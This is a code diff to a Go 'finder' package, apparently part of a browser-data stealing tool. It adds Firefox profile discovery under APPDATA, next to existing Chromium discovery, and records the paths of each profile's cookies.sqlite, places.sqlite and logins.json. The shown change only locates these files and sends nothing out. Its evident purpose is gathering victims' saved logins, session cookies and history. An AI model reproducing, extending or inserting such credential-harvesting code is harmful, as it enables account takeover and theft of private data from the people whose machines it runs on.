@@ -1,7 +1,7 @@
 package finder
 
 import (
-	"kdot/kematian/browsers/chromium/structs"
+	"kdot/kematian/browsers/structs"
 	"os"
 	"path/filepath"
 	"strings"
@@ -78,10 +78,35 @@ func (f *Finder) findBrowsers() []structs.Browser {
 						browserDB.Path = dirPath
 						browserDB.LocalState = localStatePath
 						browserDB.ProfilePath = strings.Split(path, string(os.PathSeparator))[strings.Count(path, string(os.PathSeparator))-1]
-						browserDB.Chromeium = true
 						browserDB.Profiles = profiles
+						browserDB.IsChromium = true
 						found = append(found, browserDB)
 					}
+				} else if d.IsDir() && strings.Contains(d.Name(), ".default-") && strings.Contains(root, os.Getenv("APPDATA")) {
+					mozillaBrowser := structs.Browser{}
+					pathSplit := strings.Split(path, string(os.PathSeparator))
+					mozillaBrowser.ProfilePath = pathSplit[len(pathSplit)-3]
+					mozillaBrowser.IsChromium = false
+					// mozillaBrowser.Path is the path that is one lower than path
+					mozillaBrowser.Path = filepath.Dir(path)
+
+					profiles := []structs.Profiles{}
+
+					filepath.WalkDir(path, func(path string, d os.DirEntry, err error) error {
+						if d.IsDir() && strings.Contains(d.Name(), ".default") {
+							profile := structs.Profiles{}
+							profile.NameAndPath = path
+							profile.Cookies = filepath.Join(path, "cookies.sqlite")
+							profile.History = filepath.Join(path, "places.sqlite")
+							profile.LoginData = filepath.Join(path, "logins.json")
+
+							profiles = append(profiles, profile)
+						}
+						return nil
+					})
+
+					mozillaBrowser.Profiles = profiles
+					found = append(found, mozillaBrowser)
 				}
 				return nil
 			})
